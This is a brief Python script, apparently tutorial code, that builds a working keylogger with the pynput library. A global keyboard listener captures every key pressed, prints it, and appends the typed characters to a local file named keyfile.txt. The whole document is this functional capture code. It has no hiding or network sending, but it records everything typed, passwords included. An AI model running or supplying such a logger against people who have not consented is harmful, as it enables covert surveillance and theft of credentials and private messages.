from pynput import keyboard

# Function to log each keystroke
def keyPressed(key):
    print(str(key))

    # Log file to store key press
    with open("keyfile.txt", "a") as logkey:
        try:
            # Writing the key pressed into the log file
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    
    # Starting the listener
    listener.start()
    input()